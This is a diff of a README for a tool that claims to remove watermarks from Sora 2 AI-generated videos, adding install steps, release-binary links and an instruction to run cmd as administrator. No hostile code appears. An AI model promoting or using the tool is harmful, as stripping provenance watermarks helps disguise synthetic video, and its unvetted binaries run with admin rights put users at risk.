@@ -39,11 +39,35 @@ Traditional watermark removal tools fail with Sora 2's unique encoding patterns.
 ---
 
 ## Installation
-These setup instructions apply to Windows and Linux operating systems. Mac users can skip the manual process by downloading the [DMG bundle](https://github.com/uqogihujomuwhiff/sora2-watermark-cleaner-pro).
-```bash
+These setup instructions apply to Windows and Linux operating systems. Mac users can skip the manual process by downloading the [DMG bundle](https://github.com/uqogihujomuwhiff/sora2-watermark-cleaner-pro/releases).
+
+
+This guide covers Windows and Linux setups; macOS users can install from the [DMG file](../../releases).  
+
+
+
+
+
+Windows check: Ensure Git and Python are present.
+
+https://git-scm.com/install/windows
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Execute cmd with administrative access.
+
+
+
+
+
+```bash 
 git clone https://github.com/uqogihujomuwhiff/sora2-watermark-cleaner-pro.git
+```
+```bash 
 cd sora2-watermark-cleaner-pro
-pip install -r requirements.txt
+```
+```bash 
+py -m pip install -r requirements.txt
 ```
 
 ---
@@ -52,17 +76,17 @@ pip install -r requirements.txt
 
 ### Basic Usage
 ```bash
-python main.py --input sora_output.mp4 --output clean.mp4
+py main.py --input sora_output.mp4 --output clean.mp4
 ```
 
 ### Batch Processing
 ```bash
-python main.py --batch ./input_folder --output ./cleaned
+py main.py --batch ./input_folder --output ./cleaned
 ```
 
 ### Advanced Options
 ```bash
-python main.py --input video.mp4 --output result.mp4 --quality high --gpu
+py main.py --input video.mp4 --output result.mp4 --quality high --gpu
 ```
 
 ---
